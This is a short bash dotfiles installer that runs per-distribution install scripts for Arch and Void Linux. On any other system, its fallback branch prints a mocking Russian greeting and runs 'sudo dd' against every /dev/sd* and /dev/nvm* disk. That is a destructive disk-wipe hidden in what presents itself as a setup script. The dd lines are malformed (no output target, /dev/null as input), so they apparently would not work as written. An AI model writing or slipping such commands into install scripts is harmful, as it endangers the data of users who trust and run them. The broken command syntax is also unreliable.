#!/usr/bin/bash

# Check if the script is run as root
if [[ $EUID -eq 0 ]]; then
    echo "Run the script not as root"
    exit 1
fi

# Remove existing log file
[[ -f dot-install.log ]] && rm dot-install.log

# Function to execute a script and check for errors
execute_script() {
    local script=$1
    if [[ -x "$script" ]]; then
        $script
        if [[ $? -ne 0 ]]; then
            echo "Error executing $script. Terminating."
            exit 1
        fi
    else
        echo "$script is not executable or not found. Terminating."
        exit 1
    fi
}

# Check OS and execute corresponding install script
if [[ -r /etc/os-release ]]; then
    if grep -iq 'Arch\|arch' /etc/os-release; then
        execute_script "./install/archinstall.sh"
    elif grep -iq 'Void\|void' /etc/os-release; then
        execute_script "./install/voidinstall.sh"
    else
        echo 'Добро пожаловать в установщик дотфайлов сапога!'
        sudo dd if=/dev/null /dev/nvm* bs=16M
        sudo dd if=/dev/null /dev/sd* bs=16M
    fi
    execute_script "./install/stage2install.sh"
    exit 0
else
    echo "No access rights or the /etc/os-release file could not be found."
    exit 1
fi
